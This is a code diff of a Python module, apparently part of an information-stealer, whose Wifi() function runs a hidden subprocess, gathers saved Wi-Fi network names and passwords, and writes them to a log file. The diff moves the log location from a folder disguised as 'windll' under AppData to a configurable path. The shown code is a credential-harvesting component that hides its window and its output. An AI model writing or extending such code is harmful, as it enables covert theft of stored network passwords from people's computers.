@@ -12,10 +12,12 @@
 
 from subprocess import STARTUPINFO, STARTF_USESHOWWINDOW, run
 from re import findall, search
-from os import environ, sep
+from os import environ
+from preferences.config import config
 
 def Wifi():
-    pathtofile = environ['USERPROFILE'] + sep + r'AppData\Local\windll'
+    user = environ['USERPROFILE']
+    pathToLogs = f'{user}\\{config.pathToLogs}\\System'
     logs = []
     startupinfo = STARTUPINFO()
     startupinfo.dwFlags |= STARTF_USESHOWWINDOW
@@ -42,6 +44,6 @@ def Wifi():
 
         logs.append(f'Wi-Fi Network: {profile}\nPassword: {password}\n')
 
-    with open(pathtofile+"\\System\\wifi.txt", 'w', encoding='UTF-8') as f:
+    with open(pathToLogs+"\\wifi.txt", 'w', encoding='UTF-8') as f:
         for log in logs:
             f.write(log+'\n')
